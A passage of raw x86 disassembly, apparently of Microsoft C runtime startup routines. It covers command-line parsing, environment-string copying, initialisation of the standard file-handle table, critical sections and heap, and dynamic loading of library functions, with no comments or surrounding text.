  424e0c:	inc    DWORD PTR [esi]
  424e0e:	dec    edx
  424e0f:	jne    0x424e04
  424e11:	mov    cl,BYTE PTR [eax]
  424e13:	test   cl,cl
  424e15:	je     0x424e5f
  424e17:	cmp    DWORD PTR [ebp-0x4],0x0
  424e1b:	jne    0x424e27
  424e1d:	cmp    cl,0x20
  424e20:	je     0x424e5f
  424e22:	cmp    cl,0x9
  424e25:	je     0x424e5f
  424e27:	test   ebx,ebx
  424e29:	je     0x424e59
  424e2b:	test   edi,edi
  424e2d:	je     0x424e48
  424e2f:	movzx  edx,cl
  424e32:	test   BYTE PTR [edx+0x463a21],0x4
  424e39:	je     0x424e41
  424e3b:	mov    BYTE PTR [edi],cl
  424e3d:	inc    edi
  424e3e:	inc    eax
  424e3f:	inc    DWORD PTR [esi]
  424e41:	mov    cl,BYTE PTR [eax]
  424e43:	mov    BYTE PTR [edi],cl
  424e45:	inc    edi
  424e46:	jmp    0x424e57
  424e48:	movzx  ecx,cl
  424e4b:	test   BYTE PTR [ecx+0x463a21],0x4
  424e52:	je     0x424e57
  424e54:	inc    eax
  424e55:	inc    DWORD PTR [esi]
  424e57:	inc    DWORD PTR [esi]
  424e59:	inc    eax
  424e5a:	jmp    0x424dc7
  424e5f:	test   edi,edi
  424e61:	je     0x424e67
  424e63:	and    BYTE PTR [edi],0x0
  424e66:	inc    edi
  424e67:	inc    DWORD PTR [esi]
  424e69:	mov    ebx,DWORD PTR [ebp+0xc]
  424e6c:	jmp    0x424d92
  424e71:	mov    eax,DWORD PTR [ebp+0x8]
  424e74:	test   eax,eax
  424e76:	je     0x424e7b
  424e78:	and    DWORD PTR [eax],0x0
  424e7b:	inc    DWORD PTR [ebx]
  424e7d:	pop    edi
  424e7e:	pop    ebx
  424e7f:	leave  
  424e80:	ret    
  424e81:	push   ebp
  424e82:	mov    ebp,esp
  424e84:	push   ecx
  424e85:	push   ecx
  424e86:	push   ebx
  424e87:	push   esi
  424e88:	push   edi
  424e89:	xor    edi,edi
  424e8b:	cmp    DWORD PTR ds:0x463d6c,edi
  424e91:	jne    0x424e98
  424e93:	call   0x42601c
  424e98:	and    BYTE PTR ds:0x463714,0x0
  424e9f:	push   0x104
  424ea4:	mov    esi,0x463610
  424ea9:	push   esi
  424eaa:	push   edi
  424eab:	call   DWORD PTR ds:0x4290a8
  424eb1:	mov    eax,ds:0x463d74
  424eb6:	cmp    eax,edi
  424eb8:	mov    DWORD PTR ds:0x4635f4,esi
  424ebe:	je     0x424ec7
  424ec0:	cmp    BYTE PTR [eax],0x0
  424ec3:	mov    ebx,eax
  424ec5:	jne    0x424ec9
  424ec7:	mov    ebx,esi
  424ec9:	lea    eax,[ebp-0x4]
  424ecc:	push   eax
  424ecd:	push   edi
  424ece:	lea    esi,[ebp-0x8]
  424ed1:	xor    ecx,ecx
  424ed3:	mov    eax,ebx
  424ed5:	call   0x424d15
  424eda:	mov    esi,DWORD PTR [ebp-0x4]
  424edd:	mov    eax,DWORD PTR [ebp-0x8]
  424ee0:	shl    esi,0x2
  424ee3:	add    eax,esi
  424ee5:	push   eax
  424ee6:	call   0x426152
  424eeb:	mov    edi,eax
  424eed:	add    esp,0xc
  424ef0:	test   edi,edi
  424ef2:	jne    0x424ef9
  424ef4:	or     eax,0xffffffff
  424ef7:	jmp    0x424f1e
  424ef9:	lea    eax,[ebp-0x4]
  424efc:	push   eax
  424efd:	lea    ecx,[esi+edi*1]
  424f00:	push   edi
  424f01:	lea    esi,[ebp-0x8]
  424f04:	mov    eax,ebx
  424f06:	call   0x424d15
  424f0b:	mov    eax,DWORD PTR [ebp-0x4]
  424f0e:	dec    eax
  424f0f:	pop    ecx
  424f10:	mov    ds:0x4635d8,eax
  424f15:	pop    ecx
  424f16:	mov    DWORD PTR ds:0x4635dc,edi
  424f1c:	xor    eax,eax
  424f1e:	pop    edi
  424f1f:	pop    esi
  424f20:	pop    ebx
  424f21:	leave  
  424f22:	ret    
  424f23:	push   ecx
  424f24:	push   ecx
  424f25:	mov    eax,ds:0x463718
  424f2a:	push   ebx
  424f2b:	push   ebp
  424f2c:	push   esi
  424f2d:	push   edi
  424f2e:	mov    edi,DWORD PTR ds:0x4290c0
  424f34:	xor    ebx,ebx
  424f36:	xor    esi,esi
  424f38:	cmp    eax,ebx
  424f3a:	push   0x2
  424f3c:	pop    ebp
  424f3d:	jne    0x424f6c
  424f3f:	call   edi
  424f41:	mov    esi,eax
  424f43:	cmp    esi,ebx
  424f45:	je     0x424f53
  424f47:	mov    DWORD PTR ds:0x463718,0x1
  424f51:	jmp    0x424f71
  424f53:	call   DWORD PTR ds:0x429030
  424f59:	cmp    eax,0x78
  424f5c:	jne    0x424f67
  424f5e:	mov    eax,ebp
  424f60:	mov    ds:0x463718,eax
  424f65:	jmp    0x424f6c
  424f67:	mov    eax,ds:0x463718
  424f6c:	cmp    eax,0x1
  424f6f:	jne    0x424fee
  424f71:	cmp    esi,ebx
  424f73:	jne    0x424f7d
  424f75:	call   edi
  424f77:	mov    esi,eax
  424f79:	cmp    esi,ebx
  424f7b:	je     0x424ff6
  424f7d:	cmp    WORD PTR [esi],bx
  424f80:	mov    eax,esi
  424f82:	je     0x424f92
  424f84:	add    eax,ebp
  424f86:	cmp    WORD PTR [eax],bx
  424f89:	jne    0x424f84
  424f8b:	add    eax,ebp
  424f8d:	cmp    WORD PTR [eax],bx
  424f90:	jne    0x424f84
  424f92:	mov    edi,DWORD PTR ds:0x4290bc
  424f98:	push   ebx
  424f99:	push   ebx
  424f9a:	push   ebx
  424f9b:	sub    eax,esi
  424f9d:	push   ebx
  424f9e:	sar    eax,1
  424fa0:	inc    eax
  424fa1:	push   eax
  424fa2:	push   esi
  424fa3:	push   ebx
  424fa4:	push   ebx
  424fa5:	mov    DWORD PTR [esp+0x34],eax
  424fa9:	call   edi
  424fab:	mov    ebp,eax
  424fad:	cmp    ebp,ebx
  424faf:	je     0x424fe3
  424fb1:	push   ebp
  424fb2:	call   0x426152
  424fb7:	cmp    eax,ebx
  424fb9:	pop    ecx
  424fba:	mov    DWORD PTR [esp+0x10],eax
  424fbe:	je     0x424fe3
  424fc0:	push   ebx
  424fc1:	push   ebx
  424fc2:	push   ebp
  424fc3:	push   eax
  424fc4:	push   DWORD PTR [esp+0x24]
  424fc8:	push   esi
  424fc9:	push   ebx
  424fca:	push   ebx
  424fcb:	call   edi
  424fcd:	test   eax,eax
  424fcf:	jne    0x424fdf
  424fd1:	push   DWORD PTR [esp+0x10]
  424fd5:	call   0x42603a
  424fda:	pop    ecx
  424fdb:	mov    DWORD PTR [esp+0x10],ebx
  424fdf:	mov    ebx,DWORD PTR [esp+0x10]
  424fe3:	push   esi
  424fe4:	call   DWORD PTR ds:0x4290b8
  424fea:	mov    eax,ebx
  424fec:	jmp    0x42503e
  424fee:	cmp    eax,ebp
  424ff0:	je     0x424ffa
  424ff2:	cmp    eax,ebx
  424ff4:	je     0x424ffa
  424ff6:	xor    eax,eax
  424ff8:	jmp    0x42503e
  424ffa:	call   DWORD PTR ds:0x4290b4
  425000:	mov    esi,eax
  425002:	cmp    esi,ebx
  425004:	je     0x424ff6
  425006:	cmp    BYTE PTR [esi],bl
  425008:	je     0x425014
  42500a:	inc    eax
  42500b:	cmp    BYTE PTR [eax],bl
  42500d:	jne    0x42500a
  42500f:	inc    eax
  425010:	cmp    BYTE PTR [eax],bl
  425012:	jne    0x42500a
  425014:	sub    eax,esi
  425016:	inc    eax
  425017:	mov    ebp,eax
  425019:	push   ebp
  42501a:	call   0x426152
  42501f:	mov    edi,eax
  425021:	cmp    edi,ebx
  425023:	pop    ecx
  425024:	jne    0x42502a
  425026:	xor    edi,edi
  425028:	jmp    0x425035
  42502a:	push   ebp
  42502b:	push   esi
  42502c:	push   edi
  42502d:	call   0x426170
  425032:	add    esp,0xc
  425035:	push   esi
  425036:	call   DWORD PTR ds:0x4290b0
  42503c:	mov    eax,edi
  42503e:	pop    edi
  42503f:	pop    esi
  425040:	pop    ebp
  425041:	pop    ebx
  425042:	pop    ecx
  425043:	pop    ecx
  425044:	ret    
  425045:	sub    esp,0x48
  425048:	push   ebx
  425049:	mov    ebx,0x480
  42504e:	push   ebx
  42504f:	call   0x426152
  425054:	test   eax,eax
  425056:	pop    ecx
  425057:	jne    0x425061
  425059:	or     eax,0xffffffff
  42505c:	jmp    0x42523e
  425061:	mov    ds:0x463c60,eax
  425066:	mov    DWORD PTR ds:0x463c48,0x20
  425070:	lea    ecx,[eax+0x480]
  425076:	jmp    0x425096
  425078:	and    BYTE PTR [eax+0x4],0x0
  42507c:	or     DWORD PTR [eax],0xffffffff
  42507f:	and    DWORD PTR [eax+0x8],0x0
  425083:	mov    BYTE PTR [eax+0x5],0xa
  425087:	mov    ecx,DWORD PTR ds:0x463c60
  42508d:	add    eax,0x24
  425090:	add    ecx,0x480
  425096:	cmp    eax,ecx
  425098:	jb     0x425078
  42509a:	push   ebp
  42509b:	push   esi
  42509c:	push   edi
  42509d:	lea    eax,[esp+0x14]
  4250a1:	push   eax
  4250a2:	call   DWORD PTR ds:0x429090
  4250a8:	cmp    WORD PTR [esp+0x46],0x0
  4250ae:	je     0x42519d
  4250b4:	mov    eax,DWORD PTR [esp+0x48]
  4250b8:	test   eax,eax
  4250ba:	je     0x42519d
  4250c0:	mov    edi,DWORD PTR [eax]
  4250c2:	lea    ebp,[eax+0x4]
  4250c5:	lea    eax,[edi+ebp*1]
  4250c8:	mov    DWORD PTR [esp+0x10],eax
  4250cc:	mov    eax,0x800
  4250d1:	cmp    edi,eax
  4250d3:	jl     0x4250d7
  4250d5:	mov    edi,eax
  4250d7:	cmp    DWORD PTR ds:0x463c48,edi
  4250dd:	jge    0x42512d
  4250df:	mov    esi,0x463c64
  4250e4:	push   ebx
  4250e5:	call   0x426152
  4250ea:	test   eax,eax
  4250ec:	pop    ecx
  4250ed:	je     0x425127
  4250ef:	add    DWORD PTR ds:0x463c48,0x20
  4250f6:	mov    DWORD PTR [esi],eax
  4250f8:	lea    ecx,[eax+0x480]
  4250fe:	jmp    0x425116
  425100:	and    BYTE PTR [eax+0x4],0x0
  425104:	or     DWORD PTR [eax],0xffffffff
  425107:	and    DWORD PTR [eax+0x8],0x0
  42510b:	mov    BYTE PTR [eax+0x5],0xa
  42510f:	mov    ecx,DWORD PTR [esi]
  425111:	add    eax,0x24
  425114:	add    ecx,ebx
  425116:	cmp    eax,ecx
  425118:	jb     0x425100
  42511a:	add    esi,0x4
  42511d:	cmp    DWORD PTR ds:0x463c48,edi
  425123:	jl     0x4250e4
  425125:	jmp    0x42512d
  425127:	mov    edi,DWORD PTR ds:0x463c48
  42512d:	xor    ebx,ebx
  42512f:	test   edi,edi
  425131:	jle    0x42519d
  425133:	mov    eax,DWORD PTR [esp+0x10]
  425137:	mov    eax,DWORD PTR [eax]
  425139:	cmp    eax,0xffffffff
  42513c:	je     0x425192
  42513e:	mov    cl,BYTE PTR [ebp+0x0]
  425141:	test   cl,0x1
  425144:	je     0x425192
  425146:	test   cl,0x8
  425149:	jne    0x425156
  42514b:	push   eax
  42514c:	call   DWORD PTR ds:0x4290c8
  425152:	test   eax,eax
  425154:	je     0x425192
  425156:	mov    ecx,ebx
  425158:	mov    eax,ebx
  42515a:	and    eax,0x1f
  42515d:	lea    eax,[eax+eax*8]
  425160:	sar    ecx,0x5
  425163:	mov    ecx,DWORD PTR [ecx*4+0x463c60]
  42516a:	lea    esi,[ecx+eax*4]
  42516d:	mov    eax,DWORD PTR [esp+0x10]
  425171:	mov    eax,DWORD PTR [eax]
  425173:	mov    DWORD PTR [esi],eax
  425175:	mov    al,BYTE PTR [ebp+0x0]
  425178:	mov    BYTE PTR [esi+0x4],al
  42517b:	lea    eax,[esi+0xc]
  42517e:	push   0xfa0
  425183:	push   eax
  425184:	call   0x4264bd
  425189:	test   eax,eax
  42518b:	pop    ecx
  42518c:	pop    ecx
  42518d:	je     0x4251bd
  42518f:	inc    DWORD PTR [esi+0x8]
  425192:	add    DWORD PTR [esp+0x10],0x4
  425197:	inc    ebx
  425198:	inc    ebp
  425199:	cmp    ebx,edi
  42519b:	jl     0x425133
  42519d:	xor    ebx,ebx
  42519f:	mov    ecx,DWORD PTR ds:0x463c60
  4251a5:	lea    eax,[ebx+ebx*8]
  4251a8:	lea    esi,[ecx+eax*4]
  4251ab:	cmp    DWORD PTR [esi],0xffffffff
  4251ae:	jne    0x42521f
  4251b0:	test   ebx,ebx
  4251b2:	mov    BYTE PTR [esi+0x4],0x81
  4251b6:	jne    0x4251c2
  4251b8:	push   0xfffffff6
  4251ba:	pop    eax
  4251bb:	jmp    0x4251cc
  4251bd:	or     eax,0xffffffff
  4251c0:	jmp    0x42523b
  4251c2:	mov    eax,ebx
  4251c4:	dec    eax
  4251c5:	neg    eax
  4251c7:	sbb    eax,eax
  4251c9:	add    eax,0xfffffff5
  4251cc:	push   eax
  4251cd:	call   DWORD PTR ds:0x4290a4
  4251d3:	mov    edi,eax
  4251d5:	cmp    edi,0xffffffff
  4251d8:	je     0x425219
  4251da:	push   edi
  4251db:	call   DWORD PTR ds:0x4290c8
  4251e1:	test   eax,eax
  4251e3:	je     0x425219
  4251e5:	and    eax,0xff
  4251ea:	cmp    eax,0x2
  4251ed:	mov    DWORD PTR [esi],edi
  4251ef:	jne    0x4251f7
  4251f1:	or     BYTE PTR [esi+0x4],0x40
  4251f5:	jmp    0x425200
  4251f7:	cmp    eax,0x3
  4251fa:	jne    0x425200
  4251fc:	or     BYTE PTR [esi+0x4],0x8
  425200:	lea    eax,[esi+0xc]
  425203:	push   0xfa0
  425208:	push   eax
  425209:	call   0x4264bd
  42520e:	test   eax,eax
  425210:	pop    ecx
  425211:	pop    ecx
  425212:	je     0x4251bd
  425214:	inc    DWORD PTR [esi+0x8]
  425217:	jmp    0x425223
  425219:	or     BYTE PTR [esi+0x4],0x40
  42521d:	jmp    0x425223
  42521f:	or     BYTE PTR [esi+0x4],0x80
  425223:	inc    ebx
  425224:	cmp    ebx,0x3
  425227:	jl     0x42519f
  42522d:	push   DWORD PTR ds:0x463c48
  425233:	call   DWORD PTR ds:0x4290c4
  425239:	xor    eax,eax
  42523b:	pop    edi
  42523c:	pop    esi
  42523d:	pop    ebp
  42523e:	pop    ebx
  42523f:	add    esp,0x48
  425242:	ret    
  425243:	push   0xc
  425245:	push   0x4295f8
  42524a:	call   0x425434
  42524f:	mov    DWORD PTR [ebp-0x1c],0x42a050
  425256:	cmp    DWORD PTR [ebp-0x1c],0x42a050
  42525d:	jae    0x425281
  42525f:	and    DWORD PTR [ebp-0x4],0x0
  425263:	mov    eax,DWORD PTR [ebp-0x1c]
  425266:	mov    eax,DWORD PTR [eax]
  425268:	test   eax,eax
  42526a:	je     0x425277
  42526c:	call   eax
  42526e:	jmp    0x425277
  425270:	xor    eax,eax
  425272:	inc    eax
  425273:	ret    
  425274:	mov    esp,DWORD PTR [ebp-0x18]
  425277:	or     DWORD PTR [ebp-0x4],0xffffffff
  42527b:	add    DWORD PTR [ebp-0x1c],0x4
  42527f:	jmp    0x425256
  425281:	call   0x42546f
  425286:	ret    
  425287:	push   0xc
  425289:	push   0x429608
  42528e:	call   0x425434
  425293:	mov    DWORD PTR [ebp-0x1c],0x42a058
  42529a:	cmp    DWORD PTR [ebp-0x1c],0x42a058
  4252a1:	jae    0x4252c5
  4252a3:	and    DWORD PTR [ebp-0x4],0x0
  4252a7:	mov    eax,DWORD PTR [ebp-0x1c]
  4252aa:	mov    eax,DWORD PTR [eax]
  4252ac:	test   eax,eax
  4252ae:	je     0x4252bb
  4252b0:	call   eax
  4252b2:	jmp    0x4252bb
  4252b4:	xor    eax,eax
  4252b6:	inc    eax
  4252b7:	ret    
  4252b8:	mov    esp,DWORD PTR [ebp-0x18]
  4252bb:	or     DWORD PTR [ebp-0x4],0xffffffff
  4252bf:	add    DWORD PTR [ebp-0x1c],0x4
  4252c3:	jmp    0x42529a
  4252c5:	call   0x42546f
  4252ca:	ret    
  4252cb:	call   0x425506
  4252d0:	mov    eax,ds:0x462dfc
  4252d5:	cmp    eax,0xffffffff
  4252d8:	je     0x4252e8
  4252da:	push   eax
  4252db:	call   DWORD PTR ds:0x4290d0
  4252e1:	or     DWORD PTR ds:0x462dfc,0xffffffff
  4252e8:	ret    
  4252e9:	push   ebx
  4252ea:	push   esi
  4252eb:	call   DWORD PTR ds:0x429030
  4252f1:	push   DWORD PTR ds:0x462dfc
  4252f7:	mov    ebx,eax
  4252f9:	call   DWORD PTR ds:0x4290e0
  4252ff:	mov    esi,eax
  425301:	test   esi,esi
  425303:	jne    0x42534e
  425305:	push   0x88
  42530a:	push   0x1
  42530c:	call   0x426548
  425311:	mov    esi,eax
  425313:	test   esi,esi
  425315:	pop    ecx
  425316:	pop    ecx
  425317:	je     0x425346
  425319:	push   esi
  42531a:	push   DWORD PTR ds:0x462dfc
  425320:	call   DWORD PTR ds:0x4290dc
  425326:	test   eax,eax
  425328:	je     0x425346
  42532a:	mov    DWORD PTR [esi+0x54],0x462d50
  425331:	mov    DWORD PTR [esi+0x14],0x1
  425338:	call   DWORD PTR ds:0x4290d8
  42533e:	or     DWORD PTR [esi+0x4],0xffffffff
  425342:	mov    DWORD PTR [esi],eax
  425344:	jmp    0x42534e
  425346:	push   0x10
  425348:	call   0x4244fc
  42534d:	pop    ecx
  42534e:	push   ebx
  42534f:	call   DWORD PTR ds:0x4290d4
  425355:	mov    eax,esi
  425357:	pop    esi
  425358:	pop    ebx
  425359:	ret    
  42535a:	call   0x4254bd
  42535f:	test   eax,eax
  425361:	je     0x425373
  425363:	call   DWORD PTR ds:0x4290e4
  425369:	cmp    eax,0xffffffff
  42536c:	mov    ds:0x462dfc,eax
  425371:	jne    0x42537b
  425373:	call   0x4252cb
  425378:	xor    eax,eax
  42537a:	ret    
  42537b:	push   esi
  42537c:	push   0x88
  425381:	push   0x1
  425383:	call   0x426548
  425388:	mov    esi,eax
  42538a:	test   esi,esi
  42538c:	pop    ecx
  42538d:	pop    ecx
  42538e:	je     0x4253c0
  425390:	push   esi
  425391:	push   DWORD PTR ds:0x462dfc
  425397:	call   DWORD PTR ds:0x4290dc
  42539d:	test   eax,eax
  42539f:	je     0x4253c0
  4253a1:	mov    DWORD PTR [esi+0x54],0x462d50
  4253a8:	mov    DWORD PTR [esi+0x14],0x1
  4253af:	call   DWORD PTR ds:0x4290d8
  4253b5:	or     DWORD PTR [esi+0x4],0xffffffff
  4253b9:	mov    DWORD PTR [esi],eax
  4253bb:	xor    eax,eax
  4253bd:	inc    eax
  4253be:	pop    esi
  4253bf:	ret    
  4253c0:	call   0x4252cb
  4253c5:	xor    eax,eax
  4253c7:	pop    esi
  4253c8:	ret    
  4253c9:	cmp    DWORD PTR ds:0x4635c4,0x2
  4253d0:	jne    0x4253df
  4253d2:	cmp    DWORD PTR ds:0x4635d0,0x5
  4253d9:	jb     0x4253df
  4253db:	xor    eax,eax
  4253dd:	inc    eax
  4253de:	ret    
  4253df:	push   0x3
  4253e1:	pop    eax
  4253e2:	ret    
  4253e3:	xor    eax,eax
  4253e5:	cmp    DWORD PTR [esp+0x4],eax
  4253e9:	push   0x0
  4253eb:	sete   al
  4253ee:	push   0x1000
  4253f3:	push   eax
  4253f4:	call   DWORD PTR ds:0x429040
  4253fa:	test   eax,eax
  4253fc:	mov    ds:0x463c40,eax
  425401:	je     0x42542d
  425403:	call   0x4253c9
  425408:	cmp    eax,0x3
  42540b:	mov    ds:0x463c44,eax
  425410:	jne    0x425430
  425412:	push   0x3f8
  425417:	call   0x4267ca
  42541c:	test   eax,eax
  42541e:	pop    ecx
  42541f:	jne    0x425430
  425421:	push   DWORD PTR ds:0x463c40
  425427:	call   DWORD PTR ds:0x4290e8
  42542d:	xor    eax,eax
  42542f:	ret    
  425430:	xor    eax,eax
  425432:	inc    eax
  425433:	ret    
  425434:	push   0x4272f8
  425439:	mov    eax,fs:0x0
  42543f:	push   eax
  425440:	mov    eax,DWORD PTR [esp+0x10]
  425444:	mov    DWORD PTR [esp+0x10],ebp
  425448:	lea    ebp,[esp+0x10]
  42544c:	sub    esp,eax
  42544e:	push   ebx
  42544f:	push   esi
  425450:	push   edi
  425451:	mov    eax,DWORD PTR [ebp-0x8]
  425454:	mov    DWORD PTR [ebp-0x18],esp
  425457:	push   eax
  425458:	mov    eax,DWORD PTR [ebp-0x4]
  42545b:	mov    DWORD PTR [ebp-0x4],0xffffffff
  425462:	mov    DWORD PTR [ebp-0x8],eax
  425465:	lea    eax,[ebp-0x10]
  425468:	mov    fs:0x0,eax
  42546e:	ret    
  42546f:	mov    ecx,DWORD PTR [ebp-0x10]
  425472:	mov    DWORD PTR fs:0x0,ecx
  425479:	pop    ecx
  42547a:	pop    edi
  42547b:	pop    esi
  42547c:	pop    ebx
  42547d:	leave  
  42547e:	push   ecx
  42547f:	ret    
  425480:	cmp    eax,0x1000
  425485:	jae    0x425495
  425487:	neg    eax
  425489:	add    eax,esp
  42548b:	add    eax,0x4
  42548e:	test   DWORD PTR [eax],eax
  425490:	xchg   esp,eax
  425491:	mov    eax,DWORD PTR [eax]
  425493:	push   eax
  425494:	ret    
  425495:	push   ecx
  425496:	lea    ecx,[esp+0x8]
  42549a:	sub    ecx,0x1000
  4254a0:	sub    eax,0x1000
  4254a5:	test   DWORD PTR [ecx],eax
  4254a7:	cmp    eax,0x1000
  4254ac:	jae    0x42549a
  4254ae:	sub    ecx,eax
  4254b0:	mov    eax,esp
  4254b2:	test   DWORD PTR [ecx],eax
  4254b4:	mov    esp,ecx
  4254b6:	mov    ecx,DWORD PTR [eax]
  4254b8:	mov    eax,DWORD PTR [eax+0x4]
  4254bb:	push   eax
  4254bc:	ret    
  4254bd:	push   esi
  4254be:	push   edi
  4254bf:	xor    esi,esi
  4254c1:	mov    edi,0x463720
  4254c6:	cmp    DWORD PTR [esi*8+0x462e14],0x1
  4254ce:	jne    0x4254ee
  4254d0:	lea    eax,[esi*8+0x462e10]
  4254d7:	mov    DWORD PTR [eax],edi
  4254d9:	push   0xfa0
  4254de:	push   DWORD PTR [eax]
  4254e0:	add    edi,0x18
  4254e3:	call   0x4264bd
  4254e8:	test   eax,eax
  4254ea:	pop    ecx
  4254eb:	pop    ecx
  4254ec:	je     0x4254fa
  4254ee:	inc    esi
  4254ef:	cmp    esi,0x24
  4254f2:	jl     0x4254c6
  4254f4:	xor    eax,eax
  4254f6:	inc    eax
  4254f7:	pop    edi
  4254f8:	pop    esi
  4254f9:	ret    
  4254fa:	and    DWORD PTR [esi*8+0x462e10],0x0
  425502:	xor    eax,eax
  425504:	jmp    0x4254f7
  425506:	push   ebx
  425507:	mov    ebx,DWORD PTR ds:0x4290cc
  42550d:	push   esi
  42550e:	mov    esi,0x462e10
  425513:	push   edi
  425514:	mov    edi,DWORD PTR [esi]
  425516:	test   edi,edi
  425518:	je     0x42552d
  42551a:	cmp    DWORD PTR [esi+0x4],0x1
  42551e:	je     0x42552d
  425520:	push   edi
  425521:	call   ebx
  425523:	push   edi
  425524:	call   0x42603a
  425529:	and    DWORD PTR [esi],0x0
  42552c:	pop    ecx
  42552d:	add    esi,0x8
  425530:	cmp    esi,0x462f30
  425536:	jl     0x425514
  425538:	mov    esi,0x462e10
  42553d:	pop    edi
  42553e:	mov    eax,DWORD PTR [esi]
  425540:	test   eax,eax
  425542:	je     0x42554d
  425544:	cmp    DWORD PTR [esi+0x4],0x1
  425548:	jne    0x42554d
  42554a:	push   eax
  42554b:	call   ebx
  42554d:	add    esi,0x8
  425550:	cmp    esi,0x462f30
  425556:	jl     0x42553e
  425558:	pop    esi
  425559:	pop    ebx
  42555a:	ret    
  42555b:	push   ebp
  42555c:	mov    ebp,esp
  42555e:	mov    eax,DWORD PTR [ebp+0x8]
  425561:	push   DWORD PTR [eax*8+0x462e10]
  425568:	call   DWORD PTR ds:0x4290f0
  42556e:	pop    ebp
  42556f:	ret    
  425570:	push   ebp
  425571:	mov    ebp,esp
  425573:	push   esi
  425574:	mov    esi,DWORD PTR [ebp+0x8]
  425577:	lea    esi,[esi*8+0x462e10]
  42557e:	cmp    DWORD PTR [esi],0x0
  425581:	je     0x425588
  425583:	xor    eax,eax
  425585:	inc    eax
  425586:	jmp    0x4255ec
  425588:	push   edi
  425589:	push   0x18
  42558b:	call   0x426152
  425590:	mov    edi,eax
  425592:	test   edi,edi
  425594:	pop    ecx
  425595:	jne    0x4255a6
  425597:	call   0x4273d0
  42559c:	mov    DWORD PTR [eax],0xc
  4255a2:	xor    eax,eax
  4255a4:	jmp    0x4255eb
  4255a6:	push   0xa
  4255a8:	call   0x4255ef
  4255ad:	cmp    DWORD PTR [esi],0x0
  4255b0:	pop    ecx
  4255b1:	jne    0x4255d9
  4255b3:	push   0xfa0
  4255b8:	push   edi
  4255b9:	call   0x4264bd
  4255be:	test   eax,eax
  4255c0:	pop    ecx
  4255c1:	pop    ecx
  4255c2:	jne    0x4255d5
  4255c4:	push   edi
  4255c5:	call   0x42603a
  4255ca:	push   0xa
  4255cc:	call   0x42555b
  4255d1:	pop    ecx
  4255d2:	pop    ecx
  4255d3:	jmp    0x425597
  4255d5:	mov    DWORD PTR [esi],edi
  4255d7:	jmp    0x4255e0
  4255d9:	push   edi
  4255da:	call   0x42603a
  4255df:	pop    ecx
  4255e0:	push   0xa
  4255e2:	call   0x42555b
  4255e7:	xor    eax,eax
  4255e9:	pop    ecx
  4255ea:	inc    eax
  4255eb:	pop    edi
  4255ec:	pop    esi
  4255ed:	pop    ebp
  4255ee:	ret    
  4255ef:	push   ebp
  4255f0:	mov    ebp,esp
  4255f2:	mov    eax,DWORD PTR [ebp+0x8]
  4255f5:	push   esi
  4255f6:	lea    esi,[eax*8+0x462e10]
  4255fd:	cmp    DWORD PTR [esi],0x0
  425600:	jne    0x425615
  425602:	push   eax
  425603:	call   0x425570
  425608:	test   eax,eax
  42560a:	pop    ecx
  42560b:	jne    0x425615
  42560d:	push   0x11
  42560f:	call   0x4244fc
  425614:	pop    ecx
  425615:	push   DWORD PTR [esi]
  425617:	call   DWORD PTR ds:0x4290f4
  42561d:	pop    esi
  42561e:	pop    ebp
  42561f:	ret    
  425620:	push   esi
  425621:	push   DWORD PTR ds:0x463d68
  425627:	call   0x427586
  42562c:	pop    ecx
  42562d:	mov    ecx,DWORD PTR ds:0x463d64
  425633:	mov    esi,eax
  425635:	mov    eax,ds:0x463d68
  42563a:	mov    edx,ecx
  42563c:	sub    edx,eax
  42563e:	add    edx,0x4
  425641:	cmp    esi,edx
  425643:	jae    0x425693
  425645:	mov    ecx,0x800
  42564a:	cmp    esi,ecx
  42564c:	jae    0x425650
  42564e:	mov    ecx,esi
  425650:	add    ecx,esi
  425652:	push   ecx
  425653:	push   eax
  425654:	call   0x4273d9
  425659:	test   eax,eax
  42565b:	pop    ecx
  42565c:	pop    ecx
  42565d:	jne    0x425676
  42565f:	add    esi,0x10
  425662:	push   esi
  425663:	push   DWORD PTR ds:0x463d68
  425669:	call   0x4273d9
  42566e:	test   eax,eax
  425670:	pop    ecx
  425671:	pop    ecx
  425672:	jne    0x425676
  425674:	pop    esi
  425675:	ret    
  425676:	mov    ecx,DWORD PTR ds:0x463d64
  42567c:	sub    ecx,DWORD PTR ds:0x463d68
  425682:	mov    ds:0x463d68,eax
  425687:	sar    ecx,0x2
  42568a:	lea    ecx,[eax+ecx*4]
  42568d:	mov    DWORD PTR ds:0x463d64,ecx
  425693:	mov    DWORD PTR [ecx],edi
  425695:	add    DWORD PTR ds:0x463d64,0x4
  42569c:	mov    eax,edi
  42569e:	pop    esi
  42569f:	ret    
  4256a0:	push   0x80
  4256a5:	call   0x426152
  4256aa:	test   eax,eax
  4256ac:	pop    ecx
  4256ad:	mov    ds:0x463d68,eax
  4256b2:	jne    0x4256b8
  4256b4:	push   0x18
  4256b6:	pop    eax
  4256b7:	ret    
  4256b8:	and    DWORD PTR [eax],0x0
  4256bb:	mov    eax,ds:0x463d68
  4256c0:	mov    ds:0x463d64,eax
  4256c5:	xor    eax,eax
  4256c7:	ret    
  4256c8:	push   0xc
  4256ca:	push   0x429618
  4256cf:	call   0x425434
  4256d4:	call   0x424747
  4256d9:	and    DWORD PTR [ebp-0x4],0x0
  4256dd:	mov    edi,DWORD PTR [ebp+0x8]
  4256e0:	call   0x425620
  4256e5:	mov    DWORD PTR [ebp-0x1c],eax
  4256e8:	or     DWORD PTR [ebp-0x4],0xffffffff
  4256ec:	call   0x4256fa
  4256f1:	mov    eax,DWORD PTR [ebp-0x1c]
  4256f4:	call   0x42546f
  4256f9:	ret    
  4256fa:	call   0x424750
  4256ff:	ret    
  425700:	push   DWORD PTR [esp+0x4]
  425704:	call   0x4256c8
  425709:	neg    eax
  42570b:	sbb    eax,eax
  42570d:	neg    eax
  42570f:	pop    ecx
  425710:	dec    eax
  425711:	ret    
  425712:	push   ebp
  425713:	mov    ebp,esp
  425715:	sub    esp,0x10
  425718:	push   ebx
  425719:	xor    ebx,ebx
  42571b:	cmp    DWORD PTR ds:0x463870,ebx
  425721:	push   esi
  425722:	push   edi
  425723:	jne    0x425792
  425725:	push   0x429688
  42572a:	call   DWORD PTR ds:0x4290f8
  425730:	mov    edi,eax
  425732:	cmp    edi,ebx
  425734:	je     0x4257cd
  42573a:	mov    esi,DWORD PTR ds:0x429028
  425740:	push   0x42967c
  425745:	push   edi
  425746:	call   esi
  425748:	test   eax,eax
  42574a:	mov    ds:0x463870,eax
  42574f:	je     0x4257cd
  425751:	push   0x42966c
  425756:	push   edi
  425757:	call   esi
  425759:	push   0x429658
  42575e:	push   edi
  42575f:	mov    ds:0x463874,eax
  425764:	call   esi
  425766:	cmp    DWORD PTR ds:0x4635c4,0x2
  42576d:	mov    ds:0x463878,eax
